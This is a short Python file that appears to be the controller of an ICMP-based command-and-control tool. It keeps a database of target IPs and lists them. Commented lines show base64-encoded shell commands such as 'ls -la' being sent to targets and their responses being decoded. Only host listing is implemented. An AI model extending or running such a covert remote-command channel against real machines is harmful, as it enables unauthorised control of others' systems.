#!/usr/bin/python3

# self.send(target['ip'], "instruction", "request", base64.b64encode("ls -la".encode()))

from scapy.all import sniff
import base64
from shellylib import Host
from tinydb import TinyDB, Query
import os
import sys
import time
import argparse

TTL = int(64)
ICMP_ID = int(12800)

class Controller(Host):
    
    def __init__(self):
        super().__init__()
        self.db = TinyDB('./db.json')

    def list_hosts(self):
        response = "[ Targets ]"

        Target = Query()
        targets = self.db.all()
        for target in targets:
            response += f" {target['ip']}"
        
        return response

    # def instruction(self):
    #     print(f"Instruction Response:\n{base64.b64decode(shellpack['data'].decode()).decode()}")

if __name__ == "__main__":
    controller = Controller()
    

    match sys.argv[1]:
        case "ls":
            print(controller.list_hosts())
            
    
    
